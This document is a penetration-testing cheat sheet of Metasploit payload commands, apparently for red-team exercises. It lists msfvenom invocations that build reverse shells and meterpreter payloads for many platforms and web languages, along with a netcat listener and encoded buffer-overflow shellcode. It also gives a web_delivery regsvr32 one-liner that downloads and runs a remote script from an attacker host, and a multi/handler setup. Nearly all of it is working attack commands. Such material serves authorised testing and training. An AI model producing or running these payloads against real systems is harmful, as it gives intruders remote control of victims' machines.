Payloads
--------



LHOST=<Your IP Address> 
LPORT=<Your Port to Connect On>




#Create connection to connect to on RedTeam(Linux)
nc -lvnp 4444



#Create shells to upload and execute on BlueTeam
msfvenom lhost=x.x.x.x lport=4444 -f exe --platform windows -p windows/shell_reverse_tcp > dev.exe
msfvenom lhost=x.x.x.x lport=4444 -f php --platform windows -p php/windows/shell_reverse_tcp > dev.exe

msfvenom -l 



Linux
-----
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f elf > shell.elf 


Windows
-------
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f exe > shell.exe 

#powershell
#powershell -ExecutionPolicy bypass -NoExit -File msf.ps1
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f psh-reflection -o msf.ps1


Mac
---
msfvenom -p osx/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f macho > shell.macho


PHP
---
msfvenom -p php/meterpreter_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php


ASP
---
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f asp > shell.asp 


JSP
---
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f raw > shell.jsp 


WAR
---
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f war > shell.war 



Python
------
msfvenom -p cmd/unix/reverse_python LHOST=x.x.x.x LPORT=xxxx -f raw > shell.py 


Bash
----
msfvenom -p cmd/unix/reverse_bash LHOST=x.x.x.x LPORT=xxxx -f raw > shell.sh 


Perl
----
msfvenom -p cmd/unix/reverse_perl LHOST=x.x.x.x PORT=xxxx -f raw > shell.pl 



Linux Based Shellcode
---------------------
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f <language> 


Windows Based Shellcode
-----------------------
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f <language> 

#Simple Buffer overflow shell (use x86/unicode_mixed in python script)
nc -lvnp 443
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#run python script

#metasploit method
use multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
set target 3
[*] Run the following command on the target machine:
regsvr32 /s /n /u /i:http://x.x.x.x:8080/IYh8OzEYxNRCQ.sct scrobj.dll

#Make the payload using which command it will run then use the python script to distribute
msfvenom -a x86 --platform Windows -p windows/exec CMD='regsvr32 /s /n /u /i:http://x.x.x.x:8080/l3zF59.sct scrobj.dll' -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python


Mac Based Shellcode
-------------------
msfvenom -p osx/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f <language> 

Handlers

   use exploit/multi/handler 
   set PAYLOAD <Payload name> 
   set LHOST <LHOST value>    
   set LPORT <LPORT value>    
   set ExitOnSession false    
   exploit -j -z              

Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
